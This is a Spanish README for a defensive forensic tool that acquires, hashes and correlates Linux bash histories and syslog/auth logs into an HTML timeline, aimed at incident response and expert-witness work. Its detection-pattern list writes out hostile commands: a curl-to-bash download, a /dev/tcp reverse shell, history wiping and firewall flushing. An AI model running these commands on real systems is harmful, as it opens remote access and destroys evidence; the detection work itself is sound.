# Forensic Bash & Syslog Analyzer

Herramienta defensiva en Python para la **adquisición, preservación, análisis y correlación temporal** de ficheros `.bash_history` y logs tipo `syslog`, `auth.log`, `messages`, `secure`, `kern.log` y similares.

El objetivo principal es ayudar en investigaciones **DFIR / periciales** a reconstruir actividad de consola, accesos SSH, comandos privilegiados, eventos de sesión y posibles indicadores de intrusión o manipulación del sistema.

> **Script principal:** `forensic_bash_syslog_analyzer.py`  
> **Versión:** `1.0.0`  
> **Requisitos:** Python 3.9+ y librería estándar  
> **Uso recomendado:** ejecución controlada como `root` cuando sea necesario acceder a `/root`, `/home/*` o `/var/log/*`

---

## Índice

1. [Descripción](#descripción)
2. [Alcance forense](#alcance-forense)
3. [Funcionalidades principales](#funcionalidades-principales)
4. [Requisitos](#requisitos)
5. [Instalación](#instalación)
6. [Uso rápido](#uso-rápido)
7. [Menú interactivo](#menú-interactivo)
8. [Uso por línea de comandos](#uso-por-línea-de-comandos)
9. [Estructura del caso](#estructura-del-caso)
10. [Informe HTML](#informe-html)
11. [Ficheros generados](#ficheros-generados)
12. [Interpretación de resultados](#interpretación-de-resultados)
13. [Limitaciones técnicas](#limitaciones-técnicas)
14. [Buenas prácticas forenses](#buenas-prácticas-forenses)
15. [Casos de uso](#casos-de-uso)
16. [Problemas frecuentes](#problemas-frecuentes)
17. [Aviso legal y pericial](#aviso-legal-y-pericial)

---

## Descripción

`Forensic Bash & Syslog Analyzer` permite adquirir y analizar evidencias locales de sistemas Linux/Unix relacionadas con:

- Historiales de comandos de Bash.
- Registros de autenticación.
- Eventos SSH.
- Sesiones PAM.
- Comandos ejecutados mediante `sudo`.
- Tareas ejecutadas por `cron`.
- Eventos relevantes en logs tradicionales de sistema.
- Indicadores de riesgo compatibles con actividad maliciosa, persistencia, exfiltración o limpieza de huellas.

La herramienta genera un **informe HTML autocontenido** con métricas, estadísticas, línea temporal y correlación entre comandos y eventos de sistema.

---

## Alcance forense

La herramienta está pensada para contextos de:

- Respuesta ante incidentes.
- Triaje forense en servidores Linux.
- Investigación de accesos no autorizados.
- Análisis de actividad SSH.
- Detección de comandos sospechosos.
- Revisión de actividad administrativa.
- Apoyo a informes periciales.
- Reconstrucción cronológica de eventos.

El script **no modifica las evidencias originales**. Realiza una copia de los ficheros localizados y calcula hashes SHA-256 sobre las copias adquiridas.

---

## Funcionalidades principales

### 1. Adquisición de evidencias

Localiza y copia, por defecto:

```text
/root/.bash_history
/home/*/.bash_history
/var/log/syslog*
/var/log/auth.log*
/var/log/messages*
/var/log/secure*
/var/log/kern.log*
/var/log/daemon.log*
```

También permite indicar rutas personalizadas mediante parámetros o desde el menú interactivo.

### 2. Preservación técnica

Por cada fichero adquirido registra:

- Ruta original.
- Ruta de adquisición.
- Tamaño.
- Fecha de modificación original.
- Fecha de cambio de metadatos original.
- Fecha de adquisición.
- Hash SHA-256.
- Errores de acceso, si los hubiera.

La información se guarda en:

```text
manifest.json
manifest.csv
case_metadata.json
```

### 3. Análisis de `.bash_history`

Extrae:

- Usuario asociado.
- Orden de comandos.
- Comando ejecutado.
- Timestamp, si existe.
- Comandos multilínea.
- Indicadores de riesgo.
- Fuente original adquirida.

Si Bash tenía activado `HISTTIMEFORMAT`, el historial puede contener líneas tipo:

```text
#1715342400
wget http://example.com/payload.sh
```

En ese caso, el script interpreta el valor epoch y lo convierte a fecha/hora local.

### 4. Análisis de syslog/auth.log

Soporta formatos tradicionales e ISO:

```text
May 10 00:45:01 hostname sudo[1234]: user : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/passwd
2026-05-10T00:45:01+02:00 hostname sshd[1234]: Accepted publickey for root from 1.2.3.4 port 55222 ssh2
```

Clasifica eventos como:

- `ssh accepted`
- `ssh failed`
- `session opened`
- `session closed`
- `sudo command`
- `cron command`
- `auth failure`
- `su`
- `system`

### 5. Detección de indicadores de riesgo

Identifica comandos o eventos relacionados con:

- Descarga remota con `wget`, `curl` o `fetch`.
- Ejecución directa por pipe a shell.
- Reverse shells.
- Borrado destructivo.
- Limpieza de huellas.
- Permisos inseguros.
- Persistencia.
- Creación o modificación de usuarios.
- Firewall, red y SSH.
- Bases de datos.
- Contenedores y cloud.
- Compresión y posible exfiltración.

Ejemplos de patrones detectados:

```bash
curl http://x.x.x.x/s.sh | bash
wget http://x.x.x.x/payload
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
history -c
truncate -s 0 ~/.bash_history
chmod 777 -R /var/www/html
crontab -e
pg_dump database > dump.sql
iptables -F
```

### 6. Timeline cruzado

Genera una línea temporal combinando:

- Comandos de `.bash_history` con timestamp.
- Eventos SSH.
- Eventos de sesión.
- Comandos `sudo`.
- Comandos `cron`.
- Eventos de autenticación fallida.
- Eventos syslog con indicadores de riesgo.

### 7. Correlación entre Bash y Syslog

Por defecto, correlaciona comandos de Bash con eventos de syslog dentro de una ventana temporal de ±300 segundos.

La correlación se basa en:

- Cercanía temporal.
- Coincidencia de usuario.
- Coincidencia textual del comando.
- Eventos de sesión o autenticación próximos.
- Actividad `sudo` o `cron` relacionada.

La ventana puede modificarse con:

```bash
--window 600
```

---

## Requisitos

- Linux o sistema compatible con rutas tipo Unix.
- Python 3.9 o superior.
- Permisos suficientes para leer los ficheros objetivo.
- No requiere dependencias externas.

Comprobar versión de Python:

```bash
python3 --version
```

---

## Instalación

Copiar el script en el sistema de análisis o en una ubicación controlada:

```bash
chmod +x forensic_bash_syslog_analyzer.py
```

Opcionalmente, verificar integridad del script antes de ejecutarlo:

```bash
sha256sum forensic_bash_syslog_analyzer.py
```

---

## Uso rápido

Ejecución recomendada para adquirir, analizar y generar informe:

```bash
sudo python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --all
```

El informe se generará en:

```text
caso_servidor_01/reports/bash_syslog_report.html
```

---

## Menú interactivo

Si se ejecuta sin parámetros, la herramienta abre un menú interactivo:

```bash
sudo python3 forensic_bash_syslog_analyzer.py
```

Opciones disponibles:

```text
1) Configurar rutas de bash_history
2) Configurar rutas de syslog/auth/messages
3) Adquirir bash_history
4) Adquirir syslog/auth/messages
5) Analizar evidencias adquiridas
6) Generar informe HTML
7) Ejecutar todo: adquirir + analizar + informe
8) Cambiar ventana de correlación
9) Salir
```

---

## Uso por línea de comandos

### Adquirir todo, analizar y generar informe

```bash
sudo python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --all
```

### Solo adquirir bash history

```bash
sudo python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --acquire-bash
```

### Solo adquirir logs de sistema

```bash
sudo python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --acquire-syslog
```

### Analizar evidencias ya adquiridas

```bash
python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --analyze
```

### Generar informe desde evidencias ya adquiridas

```bash
python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --report
```

### Indicar rutas personalizadas

```bash
sudo python3 forensic_bash_syslog_analyzer.py \
  --case-dir caso_servidor_01 \
  --all \
  --bash-path /root/.bash_history \
  --bash-path /home/*/.bash_history \
  --syslog-path /var/log/syslog* \
  --syslog-path /var/log/auth.log* \
  --syslog-path /var/log/secure*
```

### Cambiar ventana de correlación

```bash
sudo python3 forensic_bash_syslog_analyzer.py \
  --case-dir caso_servidor_01 \
  --all \
  --window 900
```

En este ejemplo, la correlación se hará con una ventana de ±900 segundos.

---

## Estructura del caso

Al ejecutar la herramienta, se crea una estructura similar a:

```text
caso_servidor_01/
├── acquisition/
│   ├── bash_history/
│   │   ├── root__.bash_history
│   │   └── home__usuario__.bash_history
│   └── syslog/
│       ├── var__log__auth.log
│       ├── var__log__auth.log.1
│       └── var__log__syslog
├── analysis/
│   ├── bash_commands.csv
│   ├── bash_commands.json
│   ├── syslog_events.csv
│   └── syslog_events.json
├── reports/
│   └── bash_syslog_report.html
├── case_metadata.json
├── manifest.csv
└── manifest.json
```

---

## Informe HTML

El informe HTML incluye las siguientes secciones:

### Resumen ejecutivo

Muestra:

- Total de comandos localizados.
- Comandos con hora exacta.
- Comandos sin hora.
- Comandos únicos.
- Total de eventos syslog/auth.
- Número de indicadores de riesgo.

### Estadísticas

Incluye gráficos HTML simples sobre:

- Binarios o comandos más usados.
- Usuarios detectados en `.bash_history`.
- Categorías de eventos syslog.
- IPs detectadas en accesos SSH.

### Actividad por hora y día

Permite observar concentración temporal de actividad tanto en Bash como en syslog.

### Indicadores de riesgo

Lista comandos y eventos potencialmente relevantes para investigación.

### Línea temporal cruzada

Combina eventos de Bash y Syslog para facilitar la reconstrucción cronológica.

### Comandos Bash y correlación cercana en Syslog

Muestra, comando por comando, los eventos de syslog próximos o relacionados.

### Cadena de custodia técnica

Incluye el manifiesto de evidencias adquiridas con hashes SHA-256.

---

## Ficheros generados

### `manifest.json` / `manifest.csv`

Registro de adquisición con hashes y metadatos.

Campos principales:

```text
type
source_path
acquired_path
sha256
size_bytes
source_mtime
source_ctime
acquired_at
error
```

### `case_metadata.json`

Información del entorno de ejecución:

```text
tool
version
created_at
hostname
fqdn
platform
python
username_running_script
uid
gid
timezone
argv
```

### `analysis/bash_commands.json`

Comandos extraídos de `.bash_history`.

Campos principales:

```text
source_file
user
command
timestamp
epoch
order
file_mtime
risk_tags
```

### `analysis/syslog_events.json`

Eventos extraídos de syslog/auth.log.

Campos principales:

```text
source_file
timestamp
raw_timestamp
host
process
pid
message
category
user
src_ip
command
risk_tags
```

### `reports/bash_syslog_report.html`

Informe HTML principal.

---

## Interpretación de resultados

### Comandos con timestamp

Son comandos donde `.bash_history` contenía una línea epoch inmediatamente anterior al comando.

Ejemplo:

```text
#1715342400
whoami
```

Estos comandos pueden ubicarse temporalmente con mayor precisión.

### Comandos sin timestamp

Si no existe `HISTTIMEFORMAT`, Bash no guarda la hora de ejecución del comando. En ese caso, el script conserva:

- El comando.
- El usuario asociado.
- El orden relativo dentro del historial.
- La fuente.
- Los indicadores de riesgo.

Pero no atribuye una hora exacta.

### Eventos `sudo`

Los eventos `sudo` son especialmente relevantes porque suelen registrar el comando ejecutado con privilegios.

Ejemplo:

```text
sudo: usuario : TTY=pts/0 ; PWD=/home/usuario ; USER=root ; COMMAND=/usr/bin/apt update
```

### Eventos SSH

Permiten contextualizar accesos:

- Usuario autenticado.
- IP de origen.
- Puerto de origen.
- Método de autenticación.
- Fallos de acceso.

### Correlación temporal

Una correlación temporal no implica, por sí sola, atribución plena. Debe interpretarse junto con:

- Sesiones SSH.
- Usuario local.
- TTY.
- Eventos `sudo`.
- Logs adicionales.
- Integridad de los ficheros.
- Hora del sistema.
- Posibles cambios de zona horaria o fecha.

---

## Limitaciones técnicas

1. **Bash no guarda hora por defecto.**  
   Solo existe hora exacta si estaba activado `HISTTIMEFORMAT` antes de ejecutar los comandos.

2. **Syslog no registra todos los comandos.**  
   Normalmente registra `sudo`, `cron`, autenticación, servicios y eventos de sistema, pero no todos los comandos interactivos.

3. **Los logs pueden estar rotados, borrados o manipulados.**  
   La ausencia de eventos no prueba que no hayan ocurrido.

4. **El año en logs tradicionales puede inferirse por metadatos.**  
   Logs tipo `May 10 00:45:01` no incluyen año. El script intenta inferirlo a partir del fichero, pero debe validarse pericialmente.

5. **La correlación es probabilística/técnica, no concluyente.**  
   Un evento próximo en tiempo ayuda a contextualizar, pero no sustituye el análisis pericial.

6. **No sustituye herramientas como `auditd`, EDR, SIEM o journal completo.**  
   Si existen, deben analizarse de forma complementaria.

---

## Buenas prácticas forenses

Para un uso pericial más robusto:

1. Trabajar, siempre que sea posible, sobre una imagen forense o copia preservada.
2. Documentar quién ejecuta la herramienta, cuándo, dónde y con qué finalidad.
3. Calcular hash del script antes de su uso.
4. Redirigir salida de terminal a un log de actuación.
5. Evitar alterar ficheros originales.
6. Montar evidencias en solo lectura cuando sea viable.
7. Documentar zona horaria del sistema.
8. Comprobar si la fecha/hora del sistema pudo ser modificada.
9. Revisar `journalctl`, `auditd`, `wtmp`, `btmp`, `lastlog`, logs de aplicación y logs de base de datos.
10. Interpretar indicadores de riesgo dentro del contexto del caso.

Ejemplo de ejecución documentada:

```bash
script -a actuacion_forense_$(date +%Y%m%d_%H%M%S).log
sudo python3 forensic_bash_syslog_analyzer.py --case-dir caso_servidor_01 --all
exit
```

---

## Casos de uso

### Investigación de intrusión SSH

Permite cruzar:

- IPs de origen.
- Usuarios autenticados.
- Apertura/cierre de sesiones.
- Comandos ejecutados con `sudo`.
- Actividad sospechosa en Bash.

### Sospecha de exfiltración

Detecta patrones relacionados con:

- `tar`, `zip`, `gzip`, `7z`.
- `scp`, `rsync`, `curl`, `wget`.
- Rutas sensibles como `/home`, `/root`, `/var/www`, `/etc`, `.ssh`, `postgres`, `mysql`.

### Sospecha de persistencia

Detecta actividad asociada a:

- `crontab`.
- `systemctl enable`.
- `/etc/systemd`.
- `/etc/cron*`.
- `authorized_keys`.
- Usuarios nuevos o modificaciones de permisos.

### Investigación de bases de datos

Identifica comandos como:

- `pg_dump`
- `psql`
- `mysqldump`
- `mysql`
- `mongoexport`
- `mongodump`
- `sqlite3`

---

## Problemas frecuentes

### No aparecen comandos con hora exacta

Probablemente el sistema no tenía activado `HISTTIMEFORMAT`.

Comprobar en el historial si existen líneas tipo:

```text
#1715342400
```

Si no existen, Bash no almacenó la hora exacta de cada comando.

### El informe muestra muchos comandos sin hora

Es esperable en sistemas donde Bash no estaba configurado para guardar timestamps. El script los conserva, pero evita atribuirles una hora exacta.

### No se adquieren ficheros de `/root` o `/var/log`

Ejecutar con permisos suficientes:

```bash
sudo python3 forensic_bash_syslog_analyzer.py --all
```

### Logs comprimidos `.gz`

La herramienta intenta leer logs rotados comprimidos con gzip.

### Hay errores de acceso en el manifiesto

Revisar `manifest.csv` o `manifest.json`. Los errores quedan documentados en el campo `error`.

---

## Aviso legal y pericial

Esta herramienta está orientada exclusivamente a tareas defensivas, periciales, de auditoría autorizada y respuesta ante incidentes.

El informe generado debe considerarse un **apoyo técnico** para el análisis, no una conclusión automática. La interpretación final debe realizarse por personal cualificado, teniendo en cuenta:

- Contexto del sistema.
- Integridad de las evidencias.
- Cadena de custodia.
- Posibles manipulaciones.
- Zona horaria.
- Configuración de Bash.
- Rotación de logs.
- Otros artefactos disponibles.

La correlación entre `bash_history` y `syslog` debe expresarse con cautela en sede judicial, especialmente cuando los comandos carezcan de timestamp propio.

---

## Roadmap recomendado

Posibles mejoras futuras:

- Integración con `journalctl`.
- Análisis de `wtmp`, `btmp` y `lastlog`.
- Exportación STIX/CSV enriquecido.
- Soporte para logs de PostgreSQL, Nginx y Apache.
- Generación de informe PDF.
- Modo triage live-response con mínimo impacto.
- Firmado del manifiesto.
- Generación de hash SHA-256 del informe final.
- Vista gráfica avanzada de timeline.

---

## Ejemplo de flujo de trabajo recomendado

```bash
# 1. Crear directorio de caso
mkdir -p /mnt/forense/caso_servidor_01

# 2. Copiar herramienta
cp forensic_bash_syslog_analyzer.py /mnt/forense/caso_servidor_01/
cd /mnt/forense/caso_servidor_01/

# 3. Calcular hash de la herramienta
sha256sum forensic_bash_syslog_analyzer.py > tool_hash.txt

# 4. Registrar actuación de terminal
script -a ejecucion_herramienta.log

# 5. Ejecutar adquisición y análisis
sudo python3 forensic_bash_syslog_analyzer.py --case-dir output --all

# 6. Finalizar registro
exit

# 7. Revisar informe
xdg-open output/reports/bash_syslog_report.html
```

---

## Autor

Jorge Coronado aka (JorgeWebsec)
Instagram: @elperitoinf
LinkedIn: https://www.linkedin.com/in/jorge-coronado-quantika14/
